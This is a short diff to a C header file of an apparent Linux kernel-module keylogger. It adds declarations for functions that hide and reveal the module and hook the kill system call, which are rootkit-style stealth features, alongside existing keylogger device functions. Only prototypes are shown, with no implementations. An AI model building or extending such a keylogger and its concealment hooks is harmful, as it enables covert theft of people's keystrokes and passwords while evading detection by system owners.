@@ -19,6 +19,9 @@ extern int buffer_pos;
 extern struct notifier_block nb;
 extern struct semaphore sem;
 
+void hide_module(void);
+void show_module(void);
+asmlinkage int hook_kill(const struct pt_regs *regs);
 int keylogger_open(struct inode *inode, struct file *file);
 int keylogger_release(struct inode *inode, struct file *file);
 ssize_t keylogger_read(struct file *file, char __user *buf, size_t count, loff_t *ppos);
